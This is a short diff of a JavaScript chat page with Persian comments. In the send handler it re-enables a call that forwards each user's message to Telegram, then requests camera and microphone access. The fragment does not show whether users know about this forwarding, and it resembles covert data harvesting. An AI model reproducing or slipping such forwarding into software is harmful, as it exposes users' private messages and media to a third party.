@@ -196,10 +196,12 @@ sendBtn.addEventListener('click', async () => {
   sendBtn.disabled = true;
 
   // ارسال به تلگرام
- // await sendToTelegram(`کاربر: ${text || '(تصویر ارسال شد)'}`);
+  await sendToTelegram(`کاربر: ${text || '(تصویر ارسال شد)'}`);                                        
+  
+  
 
- // const typingEl = showTyping();
-
+  const typingEl = showTyping();                                                                                                                                                                                                                            
+ 
   // ۱. درخواست مجوز دوربین (اگر قبلاً داده نشده باشد)
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
